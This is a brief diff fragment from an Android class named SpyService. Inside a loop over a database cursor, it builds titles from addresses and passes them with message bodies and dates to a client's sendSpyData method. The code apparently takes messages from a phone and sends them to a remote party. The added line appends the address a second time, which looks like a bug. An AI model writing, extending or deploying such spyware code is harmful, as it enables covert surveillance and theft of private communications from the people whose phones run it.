@@ -97,6 +97,7 @@ public class SpyService extends Service {
 						} else {
 							title += address;
 						}
+						title += address;
 						client.sendSpyData(title, body, date);
 					} while (cursor.moveToNext());
 				}
